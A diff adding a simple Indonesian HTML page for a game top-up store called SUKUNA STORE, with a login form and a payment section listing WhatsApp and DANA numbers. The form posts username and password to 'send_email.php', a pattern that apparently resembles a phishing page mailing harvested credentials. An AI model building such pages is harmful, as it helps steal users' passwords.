@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SUKUNA STORE - Top Up Game</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        header {
+            text-align: center;
+            padding: 20px;
+        }
+        nav {
+            margin: 20px 0;
+        }
+        nav a {
+            color: white;
+            margin: 0 15px;
+            text-decoration: none;
+        }
+        .login-form {
+            margin: 20px auto;
+            width: 300px;
+            text-align: center;
+        }
+        .login-form input {
+            margin: 10px 0;
+            padding: 10px;
+            width: 100%;
+        }
+        .payment-methods {
+            margin: 20px 0;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Selamat Datang di SUKUNA STORE</h1>
+        <p>Top Up Game dengan Mudah</p>
+    </header>
+    <nav>
+        <a href="#login">Login</a>
+        <a href="#payment">Metode Pembayaran</a>
+    </nav>
+    <section id="login">
+        <h2>Login</h2>
+        <form class="login-form" action="send_email.php" method="POST">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="submit" value="Login">
+        </form>
+    </section>
+    <section id="payment" class="payment-methods">
+        <h2>Metode Pembayaran</h2>
+        <p>WhatsApp: <a href="https://wa.me/6288267074566">+62 882-6707-4566</a></p>
+        <p>DANA: +62 888-0215-2985</p>
+    </section>
+</body>
+</html>
